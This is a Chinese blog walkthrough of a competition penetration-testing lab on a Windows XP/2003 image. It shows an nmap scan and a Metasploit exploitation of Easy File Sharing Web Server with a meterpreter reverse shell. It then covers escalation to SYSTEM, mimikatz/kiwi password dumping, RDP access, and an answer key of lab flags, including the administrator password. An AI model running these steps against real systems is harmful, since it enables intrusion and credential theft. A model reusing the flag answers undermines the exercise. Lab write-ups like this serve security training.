---
title: PY-Windows2020-J
date: 2021-09-10 15:06:07
categories: 网络安全
tags:
      - 中科磐云	
      - P100
password: zhimakaimen123.
---

# 磐云P100-Windows2020.img

## 0x01 - 信息收集

> 先通过nmap 扫描下 这个系统

```shell
nmap -sV 192.168.83.130 -O                                         255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 13:31 CST
Nmap scan report for 192.168.83.130
Host is up (0.0018s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
25/tcp   open  smtp          Microsoft ESMTP 6.0.2600.5512
80/tcp   open  http          Easy File Sharing Web Server httpd 6.9
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  https?
444/tcp  open  ssl/snpp?
445/tcp  open  microsoft-ds  Microsoft Windows XP microsoft-ds
1026/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8080/tcp open  http          Microsoft IIS httpd 5.1
MAC Address: 52:54:00:4A:F7:50 (QEMU virtual NIC)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003
OS details: Microsoft Windows XP SP2 or SP3, or Windows Server 2003
Network Distance: 1 hop
Service Info: Host: pysecanq-fc05b3; OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.14 seconds

```

可以看出这是个 **XP** 或 **2003** 的系统 ，用 **Easy File Sharing Web Server** 开启了一个 ***WEB*** 服务，远程桌面端口也开放着。

## 0x02 - 漏洞利用

> Easy File Sharing Web Server 经查询 该软件存在远程溢出漏洞，可以使用 msf模块直接利用
>
> exploit windows/http/easyfilesharing_seh

```shell
#设置目标 ip
set RHOST ip
#设置目标 port
set RPORT 80
#设置payload
set payload windows/meterpreter/reverse_tcp

```

最终效果

```shell
msf6 exploit(windows/http/easyfilesharing_seh) > show options 

Module options (exploit/windows/http/easyfilesharing_seh):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.83.130   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   80               yes       The target port (TCP)
   
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.83.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Easy File Sharing 7.2 HTTP

```

检查无误 直接 exploit

**注意 该漏洞一旦利用 程序就会崩溃退出 所以 只有一次机会**

## 0x03 - flag答题

1. 通过本地PC中渗透测试平台Kali2.0对服务器场景Windows2020进行系统服务及版本扫描渗透测试，并将该操作显示结果中8080端口对应的服务版本信息字符串作为Flag值提交；

   ```bash
   Microsoft IIS httpd 5.1
   ```

   

2. 通过本地PC中渗透测试平台Kali2.0对服务器场景Windows2020进行渗透测试，将该场景网络连接信息中的DNS信息作为Flag值 (例如：114.114.114.114) 提交；

   ```bash
   216.146.35.35
   ```

   

3. 通过本地PC中渗透测试平台Kali2.0对服务器场景Windows2020进行渗透测试，将该场景中的当前最高账户管理员的密码作为Flag值提交； 

   ```bash
   tsgem2020
   ```

   

4. 通过本地PC中渗透测试平台Kali2.0对服务器场景Windows2020进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文件名称作为Flag值提交；

   ```bash
   kwanqc.docx
   ```

   

5. 通过本地PC中渗透测试平台Kali2.0对服务器场景Windows2020进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文档内容作为Flag值提交；

   ```bash
   gqzmjh
   ```

   

6. 通过本地PC中渗透测试平台Kali2.0对服务器场景Windows2020进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为Flag值提交；

   ```bash
   capable
   ```

   

7. 通过本地PC中渗透测试平台Kali2.0对服务器场景Windows2020进行渗透测试，将该场景中回收站内文件的文档内容作为Flag值提交。

   ```bash
   qvJhyc
   ```

## 0x04 - S13PyXP 答题步骤

1. exp后先 **提权** 到 **system**

   {% asset_img 001.png %}

2. 加载 **kiwi** 模块

   > kiwi 模块之前叫 mimikatz
   >
   > 老版本的 kali 要 load mimikatz 别搞错了

   {% asset_img 002.png %}

3. 利用 **kiwi** 获取 **Administrator** 的 **密码**

   {% asset_img 003.png %}

4. **rdesktop** 远程一顿梭哈就行 

   {% asset_img 004.png %}

   {% asset_img 005.png %}

## 0x05 - 写在最后

**再看不懂 就重开吧 ！！！**

> 参考文章：https://saucer-man.com/information_security/79.html#cl-9
>
> 参考文章：https://blog.csdn.net/qq_36374896/article/details/107005461

